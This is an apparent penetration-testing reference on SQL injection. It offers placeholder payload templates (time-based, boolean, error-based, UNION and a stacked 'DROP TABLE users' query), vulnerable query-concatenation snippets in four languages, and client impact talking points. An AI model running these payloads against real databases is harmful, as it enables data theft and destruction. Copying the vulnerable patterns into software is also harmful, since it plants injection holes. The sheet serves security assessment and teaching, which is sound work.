SQL Injection Strategies and Payload Templates

This document summarizes common SQL injection strategies, payload structures, and generalized templates for building proof-of-concepts. These examples are intended to:
	•	Help analysts spot SQLi patterns in source code
	•	Assist pentesters in building safe, reusable PoCs
	•	Demonstrate business impact to clients by showing how attackers can extract or tamper with data

⸻

General Categories of SQL Injection

Strategy	Visibility	Example Goal
Boolean-based	Low	Infer data via true/false logic
Time-based (blind)	None	Use delay to infer truth
Error-based	Medium	Use error messages to leak info
Union-based	High	Extract visible data via unions
Stacked Queries	High	Add new queries (;)
Out-of-Band (OOB)	None	Force DNS/HTTP callbacks


⸻

Generalized Payload Templates

These templates use placeholders like <hidden_value> or <condition> instead of table or column names. They help describe the structure of SQLi without requiring real schema knowledge.

1. Time-Based — Length Check

<base_value> AND (
    SELECT CASE
        WHEN (LENGTH((SELECT <hidden_value> FROM <source> WHERE <condition>)) = <candidate_length>)
        THEN SLEEP(<delay_time>)
        ELSE SLEEP(0)
    END
)

	•	Use to discover length of secret string

2. Time-Based — Character Comparison

<base_value> AND (
    SELECT CASE
        WHEN (ASCII(SUBSTRING((SELECT <hidden_value> FROM <source> WHERE <condition>), <position>, 1)) > <reference_value>)
        THEN SLEEP(<delay_time>)
        ELSE SLEEP(0)
    END
)

	•	Used in binary search to extract secret values, character by character

3. Boolean-Based — True/False Inference

<base_value> AND (
    (SELECT <numeric_value> FROM <source> WHERE <condition>) = <guess>
)

	•	Response differs based on conditional truth
	•	Not useful if server returns same response regardless

4. Error-Based — Leak via Exception

<base_value> AND (SELECT 1 FROM <source> WHERE <condition> GROUP BY <non_grouped_column>)

	•	Generates DB error that reveals backend structure

5. Union-Based — Output Hijacking

<base_value> UNION SELECT <columns> FROM <source>

	•	Only works if response is reflected to user (e.g., search results)

6. Stacked Queries (multi-statement)

<base_value>; DROP TABLE users --

	•	Often blocked by filters; use only if multiple statements allowed

⸻

Common Vulnerable Patterns in Code

Java

String query = "SELECT * FROM users WHERE username = '" + user + "'";

PHP

$query = "SELECT * FROM accounts WHERE id = $_GET['id']";

Node.js (raw)

connection.query("SELECT * FROM users WHERE email = " + req.body.email);

Python (bad)

sql = "SELECT * FROM products WHERE sku = '%s'" % user_input


⸻

Business Impact Summary

Scenario	Risk Level	Impact
Dumping user credentials	Critical	Account takeover, credential reuse
Extracting API keys/tokens	Critical	Service impersonation
Reading internal config/secrets	High	Infrastructure compromise
Deleting or altering customer data	High	Compliance/legal risk
Bypassing auth (e.g., OR 1=1)	Critical	Full access to protected systems


⸻

What to Tell the Client
	•	“This vulnerability allows external attackers to read or alter sensitive data without authentication.”
	•	“An attacker could use this to pivot inside your environment or impersonate key users.”
	•	“A well-prepared payload can be run silently without generating any visible error or UI trace.”
	•	“Time-based attacks can exfiltrate data even when no output is returned.”

⸻

Next Steps
	•	Write PoCs using these templates for your exact targets
	•	Reproduce in QA with controlled input/output capture
	•	Recommend use of parameterized queries / ORM
